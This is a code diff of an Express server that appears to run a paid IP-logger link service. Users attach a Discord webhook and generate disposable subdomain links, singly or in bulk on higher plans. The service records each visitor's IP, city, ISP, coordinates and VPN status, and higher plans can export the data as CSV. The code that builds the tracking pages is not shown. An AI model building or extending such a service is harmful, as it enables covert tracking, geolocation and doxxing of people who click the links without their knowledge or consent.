@@ -4,264 +4,256 @@ const cors = require('cors');
 const dotenv = require('dotenv');
 const cron = require('node-cron');
 const path = require('path');
+const jwt = require('jsonwebtoken');
+const crypto = require('crypto');
 const User = require('./models/User');
 const Deployment = require('./models/Deployment');
-const jwt = require('jsonwebtoken');
-const bcrypt = require('bcryptjs');
+const { generateDeployedPage, deleteExpiredDeployments } = require('./utils/deployPage');
 
 dotenv.config();
 
 const app = express();
 
 // ===== CORS =====
-app.use(cors({
-  origin: '*',
-  credentials: true
-}));
-
+app.use(cors({ origin: '*', credentials: true }));
 app.use(express.json());
 
-// ===== SERVE STATIC FILES =====
+// ===== STATIC FILES =====
 app.use(express.static(path.join(__dirname, '../frontend')));
 
+// ===== MIDDLEWARE =====
+function checkToken(req, res, next) {
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  try {
+    const decoded = jwt.verify(authHeader.split(' ')[1], process.env.JWT_SECRET);
+    req.userId = decoded.userId;
+    next();
+  } catch (error) {
+    res.status(403).json({ error: 'Invalid token' });
+  }
+}
+
 // ============================================================
-// ===== ADMIN ROUTES (DIRECT IN SERVER.JS) =====
+// ===== DEPLOY ROUTES (DIRECT IN SERVER.JS) =====
 // ============================================================
 
-// Admin login
-app.post('/api/admin/login', (req, res) => {
-  const { username, password } = req.body;
-  console.log('🔑 Admin login:', username);
-  
-  if (username === process.env.ADMIN_USERNAME && password === process.env.ADMIN_PASSWORD) {
-    const token = jwt.sign({ admin: true }, process.env.JWT_SECRET, { expiresIn: '24h' });
-    return res.json({ token });
-  }
-  res.status(401).json({ error: 'Invalid credentials' });
-});
-
-// Get all users
-app.get('/api/admin/users', async (req, res) => {
+// GET MY DEPLOYMENTS
+app.get('/api/deploy/my', checkToken, async (req, res) => {
   try {
-    const users = await User.find({}).select('-password');
-    console.log('📋 Users fetched:', users.length);
-    res.json({ users });
-  } catch (err) {
-    console.error('❌ Users error:', err);
-    res.status(500).json({ error: err.message });
+    const deployments = await Deployment.find({ userId: req.userId, active: true }).sort({ createdAt: -1 });
+    res.json({ deployments });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
   }
 });
 
-// Update plan
-app.put('/api/admin/user/:userId/plan', async (req, res) => {
+// GET ALL DEPLOYMENTS
+app.get('/api/deploy/all', checkToken, async (req, res) => {
   try {
-    console.log('📝 Update plan - User ID:', req.params.userId);
-    console.log('📝 New plan:', req.body.plan);
-    
-    const user = await User.findById(req.params.userId);
-    if (!user) {
-      return res.status(404).json({ error: 'User not found' });
-    }
-    
-    user.plan = req.body.plan;
-    await user.save();
-    console.log('✅ Plan updated for:', user.email);
-    res.json({ success: true, plan: user.plan });
-  } catch (err) {
-    console.error('❌ Update plan error:', err);
-    res.status(500).json({ error: err.message });
+    const deployments = await Deployment.find({ userId: req.userId }).sort({ createdAt: -1 });
+    res.json({ deployments });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
   }
 });
 
-// Update role
-app.put('/api/admin/user/:userId/role', async (req, res) => {
+// NEW DEPLOYMENT
+app.post('/api/deploy/new', checkToken, async (req, res) => {
   try {
-    console.log('📝 Update role - User ID:', req.params.userId);
-    console.log('📝 New role:', req.body.role);
-    
-    const user = await User.findById(req.params.userId);
-    if (!user) {
-      return res.status(404).json({ error: 'User not found' });
-    }
-    
-    user.role = req.body.role;
-    await user.save();
-    console.log('✅ Role updated for:', user.email);
-    res.json({ success: true, role: user.role });
-  } catch (err) {
-    console.error('❌ Update role error:', err);
-    res.status(500).json({ error: err.message });
-  }
-});
+    const user = await User.findById(req.userId);
+    if (!user) return res.status(404).json({ error: 'User not found' });
+    if (!user.webhook) return res.status(400).json({ error: 'Set Discord webhook first' });
 
-// Delete user
-app.delete('/api/admin/user/:userId', async (req, res) => {
-  try {
-    console.log('🗑️ Delete user - ID:', req.params.userId);
-    
-    const user = await User.findByIdAndDelete(req.params.userId);
-    if (!user) {
-      return res.status(404).json({ error: 'User not found' });
-    }
-    
-    await Deployment.deleteMany({ userId: req.params.userId });
-    console.log('✅ User deleted:', user.email);
-    res.json({ success: true, message: 'User deleted' });
-  } catch (err) {
-    console.error('❌ Delete error:', err);
-    res.status(500).json({ error: err.message });
-  }
-});
+    const today = new Date().toDateString();
+    let dailyLimit = 2;
+    if (user.plan === 'pro') dailyLimit = 10;
+    if (user.plan === 'elite') dailyLimit = 50;
+    if (user.plan === 'lifetime') dailyLimit = 999;
+    if (user.role === 'owner') dailyLimit = 999;
 
-// Blacklist
-app.post('/api/admin/blacklist', async (req, res) => {
-  try {
-    const { ip } = req.body;
-    console.log('🚫 Blacklist IP:', ip);
-    
-    if (!ip || ip === 'unknown' || ip === '-' || ip === '') {
-      return res.status(400).json({ error: 'Invalid IP address' });
+    if (user.lastDeployDate === today && user.dailyDeploys >= dailyLimit) {
+      return res.status(429).json({ error: 'Daily limit reached', limit: dailyLimit, used: user.dailyDeploys });
     }
-    
-    const users = await User.find({ lastIp: ip });
-    console.log('👤 Users found with this IP:', users.length);
-    
-    if (users.length === 0) {
-      return res.status(404).json({ error: 'No users found with this IP' });
-    }
-    
-    let count = 0;
-    for (const u of users) {
-      u.blacklisted = true;
-      await u.save();
-      count++;
-    }
-    
-    res.json({ success: true, count, message: `Blacklisted ${count} users with IP ${ip}` });
-  } catch (err) {
-    console.error('❌ Blacklist error:', err);
-    res.status(500).json({ error: err.message });
-  }
-});
 
-// Unblacklist
-app.delete('/api/admin/blacklist/:userId', async (req, res) => {
-  try {
-    console.log('✅ Unblacklist - ID:', req.params.userId);
-    
-    const user = await User.findById(req.params.userId);
-    if (!user) {
-      return res.status(404).json({ error: 'User not found' });
-    }
-    
-    user.blacklisted = false;
-    await user.save();
-    console.log('✅ User unblacklisted:', user.email);
-    res.json({ success: true, message: 'User unblacklisted' });
-  } catch (err) {
-    console.error('❌ Unblacklist error:', err);
-    res.status(500).json({ error: err.message });
-  }
-});
+    let hours = 1;
+    if (user.plan === 'pro') hours = 24;
+    if (user.plan === 'elite') hours = 48;
+    if (user.plan === 'lifetime') hours = 9999;
+    if (user.role === 'owner') hours = 9999;
 
-// Stats
-app.get('/api/admin/stats', async (req, res) => {
-  try {
-    const totalUsers = await User.countDocuments();
-    const totalDeployments = await Deployment.countDocuments();
-    const activeDeployments = await Deployment.countDocuments({ active: true });
-    const totalVisits = await Deployment.aggregate([{ $group: { _id: null, total: { $sum: '$visits' } } }]);
-    
-    res.json({
-      totalUsers,
-      totalDeployments,
-      activeDeployments,
-      totalVisits: totalVisits[0]?.total || 0
+    const expiresAt = new Date();
+    expiresAt.setHours(expiresAt.getHours() + hours);
+
+    const subdomain = `${crypto.randomBytes(4).toString('hex')}-${user._id.toString().slice(-6)}`;
+    const url = `https://${subdomain}.${process.env.DOMAIN}`;
+    const pageHTML = await generateDeployedPage(user.webhook, subdomain, user._id);
+
+    const deployment = new Deployment({
+      userId: user._id,
+      subdomain,
+      url,
+      webhook: user.webhook,
+      pageHTML,
+      expiresAt,
+      active: true
     });
-  } catch (err) {
-    console.error('❌ Stats error:', err);
-    res.status(500).json({ error: err.message });
+    await deployment.save();
+
+    if (user.lastDeployDate === today) {
+      user.dailyDeploys++;
+    } else {
+      user.dailyDeploys = 1;
+      user.lastDeployDate = today;
+    }
+    await user.save();
+
+    res.json({ success: true, url, subdomain, expiresAt, expiresIn: `${hours} hour${hours > 1 ? 's' : ''}` });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// DELETE DEPLOYMENT
+app.delete('/api/deploy/:subdomain', checkToken, async (req, res) => {
+  try {
+    const deployment = await Deployment.findOne({ subdomain: req.params.subdomain });
+    if (!deployment) return res.status(404).json({ error: 'Not found' });
+    if (deployment.userId.toString() !== req.userId) return res.status(403).json({ error: 'Not yours' });
+    deployment.active = false;
+    await deployment.save();
+    res.json({ success: true });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// ===== EXPORT ALL LOGS (CSV) - Pro+ =====
+app.get('/api/deploy/export-all', checkToken, async (req, res) => {
+  try {
+    const user = await User.findById(req.userId);
+    if (!user || (user.plan !== 'pro' && user.plan !== 'elite' && user.plan !== 'lifetime' && user.role !== 'owner')) {
+      return res.status(403).json({ error: 'Upgrade to Pro or higher to export data' });
+    }
+    
+    const deployments = await Deployment.find({ userId: req.userId });
+    let csv = 'Subdomain,URL,Visits,IP,City,Region,Country,ISP,Lat,Lon,Timezone,VPN,Timestamp\n';
+    
+    deployments.forEach(d => {
+      d.ips.forEach(entry => {
+        csv += `${d.subdomain},${d.url},${d.visits},${entry.ip},${entry.city},${entry.region},${entry.country},${entry.isp},${entry.lat},${entry.lon},${entry.timezone},${entry.vpn},${entry.timestamp}\n`;
+      });
+    });
+    
+    res.setHeader('Content-Type', 'text/csv');
+    res.setHeader('Content-Disposition', 'attachment; filename=all-logs.csv');
+    res.send(csv);
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// ===== BULK DEPLOY (Elite+) =====
+app.post('/api/deploy/bulk', checkToken, async (req, res) => {
+  try {
+    const user = await User.findById(req.userId);
+    if (!user || (user.plan !== 'elite' && user.plan !== 'lifetime' && user.role !== 'owner')) {
+      return res.status(403).json({ error: 'Bulk deploy requires Elite or Lifetime plan' });
+    }
+    
+    const { count } = req.body;
+    if (!count || count < 1 || count > 10) {
+      return res.status(400).json({ error: 'Bulk deploy: 1-10 links at a time' });
+    }
+    
+    const today = new Date().toDateString();
+    let dailyLimit = user.plan === 'elite' ? 50 : 999;
+    if (user.role === 'owner') dailyLimit = 999;
+    
+    if (user.lastDeployDate === today && user.dailyDeploys >= dailyLimit) {
+      return res.status(429).json({ error: 'Daily limit reached' });
+    }
+    
+    const results = [];
+    for (let i = 0; i < count; i++) {
+      let hours = user.plan === 'elite' ? 48 : 9999;
+      if (user.role === 'owner') hours = 9999;
+      
+      const expiresAt = new Date();
+      expiresAt.setHours(expiresAt.getHours() + hours);
+      
+      const subdomain = `${crypto.randomBytes(4).toString('hex')}-${user._id.toString().slice(-6)}-${i}`;
+      const url = `https://${subdomain}.${process.env.DOMAIN}`;
+      const pageHTML = await generateDeployedPage(user.webhook, subdomain, user._id);
+      
+      const deployment = new Deployment({
+        userId: user._id,
+        subdomain,
+        url,
+        webhook: user.webhook,
+        pageHTML,
+        expiresAt,
+        active: true
+      });
+      await deployment.save();
+      results.push({ url, subdomain });
+      
+      if (user.lastDeployDate === today) {
+        user.dailyDeploys++;
+      } else {
+        user.dailyDeploys = 1;
+        user.lastDeployDate = today;
+      }
+    }
+    await user.save();
+    
+    res.json({ success: true, count, results });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
   }
 });
 
 // ============================================================
-// ===== REGULAR ROUTES =====
+// ===== AUTH ROUTES =====
 // ============================================================
-
 const authRoutes = require('./routes/auth');
-const deployRoutes = require('./routes/deploy');
-const webhookRoutes = require('./routes/webhook');
-
 app.use('/api/auth', authRoutes);
-app.use('/api/deploy', deployRoutes);
+
+// ============================================================
+// ===== ADMIN ROUTES =====
+// ============================================================
+const adminRoutes = require('./routes/admin');
+app.use('/api/admin', adminRoutes);
+
+// ============================================================
+// ===== WEBHOOK ROUTES =====
+// ============================================================
+const webhookRoutes = require('./routes/webhook');
 app.use('/api/webhook', webhookRoutes);
 
-// ===== SERVE DEPLOYED PAGES (SUBDOMAIN ROUTE) =====
+// ===== SERVE DEPLOYED PAGES =====
 app.get('/:subdomain', async (req, res) => {
   try {
     const { subdomain } = req.params;
-    
     if (subdomain === 'api' || subdomain === 'favicon.ico' || subdomain.includes('.')) {
       return res.status(404).send('Not found');
     }
-    
     const deployment = await Deployment.findOne({ subdomain, active: true });
-    
-    if (!deployment) {
-      return res.status(404).send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>Not Found</title>
-          <style>
-            body{background:#0a0a0f;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Inter',sans-serif;margin:0}
-            .box{text-align:center;color:#6a8aaa}
-            h1{color:#a78bfa;font-size:3rem}
-          </style>
-        </head>
-        <body>
-          <div class="box">
-            <h1>Page Not Found</h1>
-            <p>This link may have expired or been deleted.</p>
-          </div>
-        </body>
-        </html>
-      `);
-    }
-    
+    if (!deployment) return res.status(404).send('Page not found');
     if (new Date() > deployment.expiresAt) {
       deployment.active = false;
       await deployment.save();
-      return res.status(404).send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>Expired</title>
-          <style>
-            body{background:#0a0a0f;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Inter',sans-serif;margin:0}
-            .box{text-align:center;color:#6a8aaa}
-            h1{color:#e74c5e;font-size:3rem}
-          </style>
-        </head>
-        <body>
-          <div class="box">
-            <h1>Link Expired</h1>
-            <p>This link has expired. Contact the owner for a new one.</p>
-          </div>
-        </body>
-        </html>
-      `);
+      return res.status(404).send('Page expired');
     }
-    
     res.send(deployment.pageHTML);
   } catch (error) {
-    console.error('Subdomain error:', error);
     res.status(500).send('Server error');
   }
 });
 
 // ===== AUTO-DELETE EXPIRED =====
-const { deleteExpiredDeployments } = require('./utils/deployPage');
 cron.schedule('*/5 * * * *', () => {
   deleteExpiredDeployments();
 });
